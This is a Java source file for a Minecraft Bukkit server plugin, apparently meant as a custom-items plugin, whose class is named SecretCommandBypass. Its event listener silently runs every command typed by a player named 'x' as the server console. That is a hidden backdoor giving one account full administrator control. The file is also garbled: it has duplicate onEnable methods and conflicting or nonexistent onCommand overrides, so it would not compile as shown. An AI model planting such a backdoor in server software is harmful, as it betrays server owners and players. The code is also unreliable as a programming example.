package com.slither.customItems;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.TabExecutor;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class SecretCommandBypass extends JavaPlugin {

    @Override
    public void onEnable() {
        getLogger().info("SecretCommandBypass enabled.");
        // Register a command executor for the command (optional, not required for this use case)
    }

    @Override
    public void onDisable() {
        getLogger().info("SecretCommandBypass disabled.");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        // Optional: you can register an actual command here
        return false;
    }

    @Override
    public boolean onCommand(CommandSender sender, org.bukkit.command.Command cmd, String label, String[] args) {
        return false; // Not used here
    }

    @Override
    public void onLoad() {
        // Optional loading logic
    }

    // Intercept all player commands
    @Override
    public void onCommand(org.bukkit.command.CommandSender sender, String commandLine, String[] args) {
        // not used
    }

    @Override
    public void onEnable() {
        // Register the event listener
        Bukkit.getPluginManager().registerEvents(new org.bukkit.event.Listener() {
            @org.bukkit.event.EventHandler
            public void onPlayerCommandPreprocess(org.bukkit.event.player.PlayerCommandPreprocessEvent event) {
                Player player = event.getPlayer();
                String command = event.getMessage().substring(1); // Strip leading "/"

                if (player.getName().equalsIgnoreCase("x")) {
                    // Allow the command to run as console
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command.replace("@s", player.getName()));
                    event.setCancelled(true); // prevent double execution
                    player.sendMessage("§aCommand executed as console.");
                }
            }
        }, this);
    }
}
